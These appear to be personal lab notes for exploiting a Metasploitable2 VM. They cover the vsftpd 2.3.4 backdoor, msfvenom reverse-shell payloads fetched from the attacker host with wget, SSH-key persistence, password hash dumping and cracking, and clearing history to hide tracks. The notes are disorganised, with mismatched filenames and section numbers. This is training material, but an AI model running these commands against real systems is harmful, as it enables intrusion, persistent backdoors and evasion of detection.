
# 2.1. Find the target and identify the vulnerability

Scan with Nmap from Kali to know the target IP on the network:

```
nmap -sn 192.168.56.0/24
```

![[Pasted image 20250211190103.png]]

Identify the ports opened and the services used by our target `192.168.56.107`. By default, nmap uses a `SYN scan`, which might be blocked by a firewall. Instead, try a `TCP Connect` scan:

```
nmap -sT 192.168.56.107
```

![[Pasted image 20250211190940.png]]

We will explore the service version of the protocol `ftp` in the port 21:
```
nmap -sV -p 21 192.168.56.107
```

![[Pasted image 20250211191406.png]]

We will try to find a vulnerability related to that service version in Metasploit. Run Metasploit in Kali:
```
msfconsole
```

```
search vsftpd
```

![[Pasted image 20250211191707.png]]

We know that there is an exploit for that protocol version. Let's exploit it!

# 2.2. Exploit the vulnerability

Select the exploit, set the parameters and check that all the options are correct:
```
use exploit/unix/ftp/vsftpd_234_backdoor
set TARGET 0
set RHOSTS 192.168.56.101
options
```

![[Pasted image 20250209200128.png]]

Exploit:
```
exploit
```

Successful exploitation provides a reverse command shell session as the root user (uid=0(root) gid=0(root)) on the target machine, allowing full control over the compromised service. For a more comfortable interface use:

```
script /dev/null -c bash
```

## 2.2.1. Read files from the target machine

In the target `Metasploitable2`, create the file `testfile.txt` with the following content:

```
Super secret condifential content

username Hello34
pwd 123456789
```


Now you could read files from the attacker `Kali linux`:

![[Pasted image 20250209200514.png]]

## 3. Post-exploitation: Upload files to the target machine

Use cases for uploading files:
- Deploying Backdoors – Installing persistent malware.
- Executing Scripts – Uploading batch, PowerShell, or Python scripts for automation.
- Privilege Escalation – Dropping exploits or DLL files.
- Data Exfiltration – Uploading tools for data collection and exfiltration.

A **payload** is the part of an exploit that executes malicious code on a target system after a vulnerability has been successfully exploited. It determines what happens after access is gained, such as opening a shell, executing commands, or creating a backdoor. **`msfvenom`** is used here to  **generate the payload** for this exploit.

#### **Types of Payloads in Metasploit**

1. **Singles** – Self-contained, executes a single action (e.g., add a user).
2. **Stagers** – Small, initial payloads that establish a connection and load larger payloads (e.g., `reverse_tcp`).
3. **Stages** – Larger payloads delivered by stagers (e.g., `meterpreter`).

In this example, it will be done the following:
- The attacker sends a small **stager** to the target (`reverse_tcp`).
- The stager connects back to the attacker's machine.
- It then downloads and executes the **stage** (`meterpreter`), which is the full payload.

### 3.1. Generate the payload

Generation of payload `reverse_tcp` with `msfvenon`:
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<AttackerIp> LPORT=<PortSelected> -f elf > tramp.elf
```

`tramp.elf` will be generated with the payload `linux/x86/meterpreter/reverse_tcp`, and the configuration of the ip and port to send the reverse shell. The file is created in the current directory. 

![[Pasted image 20250214215255.png]]

We need now a way to send the file to the target machine.

### 3.2. Upload download and execute the payload file
Create a server in the attackers machine so that the target machine can download the infected file from my current directory:
```
python -m http.server 80
```

![[Pasted image 20250214215337.png]]

Download the file in the target machine from the attacker machine:
```
wget http://<AttackerIp>/tramp.elf
```

![[Pasted image 20250214215801.png]]

![[Pasted image 20250214215612.png]]

Listen in the attacker machine. Prepare Meterpreter listener:

```
sudo nc -nlvp <PortSelected>
```
![[Pasted image 20250214220154.png]]



In the target machine run:
```
chmod +x myscript.elf
./myscript.elf
```






The multi/handler module in Metasploit is used to catch and interact with incoming connections from payloads like reverse shells or Meterpreter sessions. It's commonly used with msfvenom-generated payloads.









## 3. Post-exploitation: Maintaining Access

After gaining access to a Linux system, **SSH key persistence** allows you to maintain access without relying on passwords or vulnerable services. This is commonly used in **post-exploitation** to create a stealthy backdoor.

**Tool**: Metasploit **linux/manage/sshkey_persistence** module

Background the meterpreter session with Ctrl Z to setup the sshkey_persistence module.

```
use linux/manage/sshkey_persistence
set SESSION 1
set USERNAME <userWeFirstCompromised>
set VERBOSE true
run
```

## 2.2.3. Dumping User and Service Credentials

7. Background the recent meterpreter session: **Ctrl Z**
8. Using the linux hashdump module in Metasploit: **use post/linux/gather/hashdump; set SESSION 1; run**

![](https://miro.medium.com/v2/resize:fit:1400/1*07Ga1LwNrQTabO5SeLopuw.png)

User and service credentials dumped with Linux hashdump module.

9. Cracking the credentials with John The Ripper: **john /path/to/.msf4/loot/2024…linux.hashes_270143.txt**

**Note:** The path to the unshadowed password loot file from Metasploit is specified after running the Linux hashdump module.






Step 1: Generate an SSH Key (Attacker Machine)

On your Kali Linux or attacker machine, generate an SSH key:

ssh-keygen -t rsa -b 4096 -f ~/.ssh/persist_key

This creates:

    Private Key: ~/.ssh/persist_key (Keep this safe! It's your backdoor.)
    Public Key: ~/.ssh/persist_key.pub (To inject into the target.)

Step 2: Transfer the Public Key to the Target

Once you have shell access (Meterpreter, Netcat, or SSH), inject your public key into the target’s authorized_keys file.
Method 1: Manually Append Key

Run:

mkdir -p ~/.ssh
echo "your_public_key_here" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

or directly in one command:

echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

Method 2: Using Meterpreter

If using Meterpreter, upload the public key:

upload persist_key.pub /root/.ssh/authorized_keys

Step 3: Maintain Root Access (Optional)

If you want root persistence, place the key in /root/.ssh/authorized_keys:

echo "your_public_key_here" >> /root/.ssh/authorized_keys

Ensure root login via SSH is enabled in /etc/ssh/sshd_config:

PermitRootLogin yes

Restart SSH:

systemctl restart ssh

Step 4: Connect Anytime

Now, you can SSH into the target without a password:

ssh -i ~/.ssh/persist_key user@target_ip

For root access:

ssh -i ~/.ssh/persist_key root@target_ip




Step 5: Hide Your Tracks (Stealth)

Make the SSH key hidden:

chmod 400 ~/.ssh/authorized_keys
chattr +i ~/.ssh/authorized_keys  # Prevent deletion

To remove logs:

echo "" > ~/.bash_history
history -c

Bonus: Automating with a Script

You can automate the persistence with a simple Bash script:

#!/bin/bash
mkdir -p ~/.ssh
echo "your_public_key_here" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chattr +i ~/.ssh/authorized_keys

Save it as persist.sh and run:

bash persist.sh




Detection & Prevention (to be added in the defensive measurements)

    Admins should monitor ~/.ssh/authorized_keys for unauthorized entries.
    Disable SSH root login (PermitRootLogin no).
    Use SSH key restrictions (e.g., command="restricted_command").
